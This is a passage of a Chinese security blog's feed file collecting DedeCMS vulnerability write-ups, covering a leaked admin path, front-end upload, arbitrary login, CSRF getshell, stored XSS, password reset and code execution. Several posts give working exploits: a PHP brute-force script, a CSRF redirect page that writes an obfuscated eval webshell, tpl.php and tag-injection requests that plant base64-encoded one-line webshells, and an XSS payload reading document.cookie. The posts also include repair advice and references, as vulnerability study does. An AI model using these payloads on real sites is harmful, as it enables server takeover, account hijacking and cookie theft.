class="line">$str=range(&apos;a&apos;,&apos;z&apos;);</span><br><span class="line">$number=range(0,9,1);</span><br><span class="line">$dic = array_merge($str, $number);</span><br><span class="line">$n=true;</span><br><span class="line">$nn=true;</span><br><span class="line">$path=&apos;&apos;;</span><br><span class="line">while($n)&#123;</span><br><span class="line">    foreach($dic as $v)&#123;</span><br><span class="line">        foreach($dic as $vv)&#123;</span><br><span class="line">            #echo $v.$vv .&apos;----&apos;;</span><br><span class="line">            $post_data=&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;;</span><br><span class="line">            $result=post($url,$post_data);</span><br><span class="line">            if(strpos($result,&apos;Upload filetype not allow !&apos;) === false)&#123;</span><br><span class="line">                $path=$v.$vv;$n=false;break 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">while($nn)&#123;</span><br><span class="line">    foreach($dic as $vvv)&#123;</span><br><span class="line">        $post_data=&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./$path$vvv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;;</span><br><span class="line">        $result=post($url,$post_data);</span><br><span class="line">        if(strpos($result,&apos;Upload filetype not allow !&apos;) === false)&#123;</span><br><span class="line">            $path.=$vvv;</span><br><span class="line">            echo $path . PHP_EOL;</span><br><span class="line">            $giturl=$domain.&apos;/&apos;.$path.&apos;/images/admin_top_logo.gif&apos;;</span><br><span class="line">            if(@file_get_contents($giturl))&#123;</span><br><span class="line">                echo $domain.&apos;/&apos;.$path.&apos;/&apos;;</span><br><span class="line">                $nn=false;break 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180123000746-62cc9f96-ff8e-1.png" target="_blank" rel="noopener"><img src="DedeCms后台地址泄露漏洞/20180123000746-62cc9f96-ff8e-1.png" alt="img"></a></p><h3 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h3><p>感谢给我提供这个思路的朋友</p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/</url>
      
        <content type="html"><![CDATA[<h1 id="Dedecms前台文件上传漏洞CVE-2018-20129"><a href="#Dedecms前台文件上传漏洞CVE-2018-20129" class="headerlink" title="Dedecms前台文件上传漏洞CVE-2018-20129"></a>Dedecms前台文件上传漏洞CVE-2018-20129</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>dedecmsV5.7 SP2</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>管理员用户前台可以绕过限制上传shell</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>登录并进入 <code>member/article\_add.php</code> 发布文章，选择下面的富文本编辑器插入图片 <img src="Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/af04d86a30794181263cad493b759731.png" alt> 选</p><p>择好 shell 并上传抓包</p><p> <img src="Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/189e02e32f8fc9c11570e03236594d1a.png" alt> </p><p><img src="Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/e3fef918b39b14960583f1d4e0fcb8c0.png" alt> </p><p>向如上分析修改文件名与content-type，即可返回 shell 地址 <img src="Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/3c7c9ec6b57528d6d3171b7153b5445b.png" alt></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>在最后拼接文件名时再判断一次。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/</url>
      
        <content type="html"><![CDATA[<h1 id="Dedecms任意用户登录SSV-97087"><a href="#Dedecms任意用户登录SSV-97087" class="headerlink" title="Dedecms任意用户登录SSV-97087"></a>Dedecms任意用户登录SSV-97087</h1><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>dedecmsV5.7 SP2</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>dedecms 的会员模块的身份认证使用的是客户端 session，在 Cookie 中写入用户 ID 并且附上 ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定 uid 的 ID 的 Md5 散列值。原理上可以伪造任意用户登录。</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>现在我们的思路就是 先从 <code>member/index.php</code> 中获取伪造的 DedeUserID 和它对于的 md5 使用它登录 访问 member/index.php?uid=0000001 并抓包(注意 cookie 中 last_vid 值应该为空)。 <img src="Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/f09e67a7e30cf8167f0e1f0e01ae01d9.png" alt> 可以看到已经获取到了，拿去当做DeDeUserID<img src="Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/a599b95d431c365e3edc7ba540b363a1.png" alt> 可以看到，登陆了 admin 用户。</p><h4 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h4><p>M_ID 被 intval 后还要判断是否与未 intval 之前相同。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="DedeCMS_v5.7_友情链接CSRF_GetShell"></a>DedeCMS_v5.7_友情链接CSRF_GetShell</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>DedeCMS-V5.7-UTF8-SP2  （ 发布日期  2017-03-15 ）</p><p>下载地址： 链接: <a href="https://pan.baidu.com/s/1bprjPx1" target="_blank" rel="noopener">https://pan.baidu.com/s/1bprjPx1</a> 密码: mwdq</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>该版本在新建&amp;修改标签功能（可以写PHP文件到本地）存在CSRF漏洞，通过申请友情链接的方式，诱使管理员点击，从而从 Referer 中拿到 后台路径，进而以管理员的身份写一句话到服务器上 GetShell 。</p><p>测试：</p><ol><li>申请友链</li></ol><p><img src="DedeCMS_v5.7_友情链接CSRF_GetShell/apply.png" alt></p><ol start="2"><li>编辑 友链 信息</li></ol><p><img src="DedeCMS_v5.7_友情链接CSRF_GetShell/edit.png" alt></p><p>dedecms_csrf.php 的内容如下：</p><pre><code>&lt;?php$referer = $_SERVER[&apos;HTTP_REFERER&apos;];$dede_login = str_replace(&quot;friendlink_main.php&quot;,&quot;&quot;,$referer);//去掉friendlink_main.php，取得dede后台的路径$muma = &apos;&lt;&apos;.&apos;?&apos;.&apos;@&apos;.&apos;e&apos;.&apos;v&apos;.&apos;a&apos;.&apos;l&apos;.&apos;(&apos;.&apos;$&apos;.&apos;_&apos;.&apos;P&apos;.&apos;O&apos;.&apos;S&apos;.&apos;T&apos;.&apos;[&apos;.&apos;\&apos;&apos;.&apos;c&apos;.&apos;\&apos;&apos;.&apos;]&apos;.&apos;)&apos;.&apos;;&apos;.&apos;?&apos;.&apos;&gt;&apos;;$exp = &apos;tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content=&apos;. $muma .&apos;&amp;filename=shell.lib.php&apos;;$url = $dede_login.$exp;header(&quot;location: &quot;.$url);exit();</code></pre><ol start="3"><li>管理员登陆后台后 对 友链进行审核</li></ol><p><img src="DedeCMS_v5.7_友情链接CSRF_GetShell/link_list.png" alt></p><ol start="4"><li>审核的时候一般都会点击 地址 看一下网站的内容，由于友链中使用了header 跳转，所以结果其实是访问了 <code>http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content=%3C?@eval($_POST[%27c%27]);?%3E&amp;filename=shell.lib.php</code> 请求。</li></ol><p><img src="DedeCMS_v5.7_友情链接CSRF_GetShell/click_res.png" alt></p><ol start="5"><li>查看写入到服务器的一句话 <code>shell.lib.php</code></li></ol><p><img src="DedeCMS_v5.7_友情链接CSRF_GetShell/shell.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://0day5.com/archives/4209/" target="_blank" rel="noopener">http://0day5.com/archives/4209/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-v5-7-shops-delivery-存储型XSS"><a href="#DedeCMS-v5-7-shops-delivery-存储型XSS" class="headerlink" title="DedeCMS_v5.7_shops_delivery_存储型XSS"></a>DedeCMS_v5.7_shops_delivery_存储型XSS</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>DedeCMS-V5.7-UTF8-SP2  （ 发布日期  2017-03-15 ）</p><p>需要站点启用商城功能。</p><p>下载地址： 链接: <a href="https://pan.baidu.com/s/1bprjPx1" target="_blank" rel="noopener">https://pan.baidu.com/s/1bprjPx1</a> 密码: mwdq</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>该漏洞比较鸡肋，需要登录 管理员后台通过 添加配送方式 功能 ，添加后在前后台都会触发 存储型 XSS</p><p>之所以会触发是因为在系统对 管理员输入的 配送方式-描述字段（des）在入库前只进行 addslashes 转义特殊字符处理，其实这没毛病</p><p>重要的是取出数据库的数据输出到页面前没进行 HTML 实体编码处理直接输出导致最终的 XSS</p><p>测试：</p><ol><li>后台添加 配送方式</li></ol><p><img src="DedeCMS_v5.7_shops_delivery_存储型XSS/add_delivery.png" alt></p><ol start="2"><li>添加成功后直接展示配送方式列表，触发 XSS</li></ol><p><img src="DedeCMS_v5.7_shops_delivery_存储型XSS/show_delivery.png" alt></p><ol start="3"><li>此外，这个 XSS 在前台用户购买东西选择配送方式的时候也会触发</li></ol><p><img src="DedeCMS_v5.7_shops_delivery_存储型XSS/front_xssed.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.seebug.org/vuldb/ssvid-92863" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92863</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-v5-7-carbuyaction-存储型XSS"><a href="#DedeCMS-v5-7-carbuyaction-存储型XSS" class="headerlink" title="DedeCMS_v5.7_carbuyaction_存储型XSS"></a>DedeCMS_v5.7_carbuyaction_存储型XSS</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>DedeCMS-V5.7-UTF8-SP2  （ 发布日期  2017-03-15 ）</p><p>需要站点启用商城功能。</p><p>下载地址： 链接: <a href="https://pan.baidu.com/s/1bprjPx1" target="_blank" rel="noopener">https://pan.baidu.com/s/1bprjPx1</a> 密码: mwdq</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>该漏洞 通过用户在编写订单收货地址的相关参数 注入 XSS Payload，导致 前台查看订单的页面和后台管理员查看订单详情的页面都会被 XSS。</p><p>所以说，可以用来打管理员 Cookie 。</p><p>测试：</p><ol><li>首先管理员添加一项商城的商品</li></ol><p><img src="DedeCMS_v5.7_carbuyaction_存储型XSS/add_good.png" alt></p><ol start="2"><li>前台用户选定商品添加购物车</li></ol><p><img src="DedeCMS_v5.7_carbuyaction_存储型XSS/add_shopcar.png" alt></p><ol start="3"><li>前台用户编辑订单的收货地址，在这里 address,des,email,postname 都是存在 XSS 的，插入 XSS Payload</li></ol><p><img src="DedeCMS_v5.7_carbuyaction_存储型XSS/edit_address.png" alt></p><ol start="4"><li>查看订单详情发现前台已经被 XSS</li></ol><p><img src="DedeCMS_v5.7_carbuyaction_存储型XSS/xssed.png" alt></p><ol start="5"><li>管理员进入后台查看商城订单同样也会被 XSS  :p</li></ol><p><img src="DedeCMS_v5.7_carbuyaction_存储型XSS/back_xssed.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.seebug.org/vuldb/ssvid-92855" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92855</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="Dedecms-前台任意用户密码修改"><a href="#Dedecms-前台任意用户密码修改" class="headerlink" title="Dedecms 前台任意用户密码修改"></a>Dedecms 前台任意用户密码修改</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>dedecmsV5.7 SP2</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在用户密码重置功能处，php 存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是 member 表中的密码，即使修改了管理员密码也是 member 表中的管理员密码，仍是无法进入管理。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在找回密码处，点击通过安全问题取回</p><p><img src="Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/a2ea6d0d1c946ac0f125cc858abd952a.png" alt> </p><p>填写信息并抓包，修改 id 和 userid 为想要重置密码的对象，再加上以上分析内容，发包即可得到修改密码 url <img src="Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/d05ffaa4c133f9a4d2af347cd61b15b1.png" alt> 进入该url，修改密码。 <img src="Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/2b3d56c8cf5fdeb4bbaa837ae457fa08.png" alt></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>改为强类型比较</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/</url>
      
        <content type="html"><![CDATA[<h1 id="Dedecms-V5-7后台任意代码执行CVE-2018-7700"><a href="#Dedecms-V5-7后台任意代码执行CVE-2018-7700" class="headerlink" title="Dedecms V5.7后台任意代码执行CVE-2018-7700"></a>Dedecms V5.7后台任意代码执行CVE-2018-7700</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞的触发文件为 /dede/tag_test_action.php。起因是 csrf_check() 函数的绕过，导致可执行任意代码。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/后台地址/tag_test_action.php?url=a&amp;token=&amp;partcode=&#123;dede:field name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:field&#125;</span><br></pre></td></tr></table></figure><p><img src="Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/20180328005501-96c638a6-31df-1.png" alt> </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>登录后台</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>重新实现 csrf_check() 函数</p><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p>先知社区：<a href="https://xz.aliyun.com/t/2224" target="_blank" rel="noopener">https://xz.aliyun.com/t/2224</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>DedeCMS V5.7 SP2后台存在代码执行漏洞</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>DedeCMS V5.7 SP2</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的tpl.php中存在代码执行漏洞,可以通过该漏洞在增加新标签中上传木马,获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>默认后台地址 <code>/dede/</code>，文件 <code>dede/tpl.php</code> 中的251到281行。</p><pre><code>csrf_check();    #filename和前面正则的匹配情况    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))    {        ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);        exit();    }    require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);    #搜索filename中匹配`\.lib\.php$#i`的部分，以空格代替    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);    #去掉反斜号    $content = stripslashes($content);    #拼接文件名    $truefile = DEDEINC.&apos;/taglib/&apos;.$filename;    #写入内容    $fp = fopen($truefile, &apos;w&apos;);    fwrite($fp, $content);    fclose($fp);</code></pre><p>replace处理之后赋值给变量 $tagname 。但是写入文件的时候并没有用到$tagname 。<br>那为什么有这个$tagname，拼接文件名的时候，应该是拼接<code>tagname</code></p><p>利用</p><pre><code>1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。3.这里还有一个csrf_check()函数，即请求中必须要带token参数。</code></pre><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>首先获取<code>token</code>。访问域名 + <code>/dede/tpl.php?action=upload</code></p><p> <a href="http://127.0.0.1/uploads/dede/tpl.php?action=upload" target="_blank" rel="noopener">http://127.0.0.1/uploads/dede/tpl.php?action=upload</a></p><p> 通过查看页面源码即可获得 token</p></li></ol><p><img src="DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/token.png" alt="token"></p><p>2.然后访问 </p><pre><code>http://127.0.0.1/dede/tpl.php?filename=secnote.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=你的token值</code></pre><p>shell 地址</p><pre><code>http://127.0.0.1/include/taglib/secnote.lib.php</code></pre><p><img src="DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p>DedeCMS V5.7 SP2后台存在代码执行漏洞：<a href="http://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/164035.html</a></p><p>Dede CMS 下载中心：<a href="http://www.dedecms.com/products/dedecms/downloads/" target="_blank" rel="noopener">http://www.dedecms.com/products/dedecms/downloads/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCms-v5-6-嵌入恶意代码执行漏洞"><a href="#DedeCms-v5-6-嵌入恶意代码执行漏洞" class="headerlink" title="DedeCms v5.6 嵌入恶意代码执行漏洞"></a>DedeCms v5.6 嵌入恶意代码执行漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>在上传软件的地方，对本地地址没有进行有效的验证，可以被恶意利用。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>DedeCms v5.6</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>注册会员，上传软件：本地地址中填入如下：</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#123;/dede:link&#125;&#123;dede:toby57 name\=&quot;&apos;]=0;phpinfo();//&quot;&#125;x&#123;/dede:toby57&#125;，</span><br></pre></td></tr></table></figure><p>发表后查看或修改即可执行。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#123;/dede:link&#125;&#123;dede:toby57 name\=&quot;&apos;]=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//&quot;&#125;x&#123;/dede:toby57&#125;</span><br></pre></td></tr></table></figure><p>生成x.php 密码：xiao直接生成一句话。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>知道创宇：<a href="https://www.seebug.org/vuldb/ssvid-20352" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-20352</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/</url>
      
        <content type="html"><![CDATA[<h1 id="Dedecms-swf文件反射型xss"><a href="#Dedecms-swf文件反射型xss" class="headerlink" title="Dedecms swf文件反射型xss"></a>Dedecms swf文件反射型xss</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。</p><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>DedeCMS 5.7</p><h2 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h2><p>漏洞文件为：<a href="http://127.0.0.1/images/swfupload/swfupload.swf" target="_blank" rel="noopener">http://127.0.0.1/images/swfupload/swfupload.swf</a></p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/images/swfupload/swfupload.swf?movieName=&quot;])&#125;catch(e)&#123;if(!window.x)&#123;window.x=1;alert(document.cookie)&#125;&#125;//</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
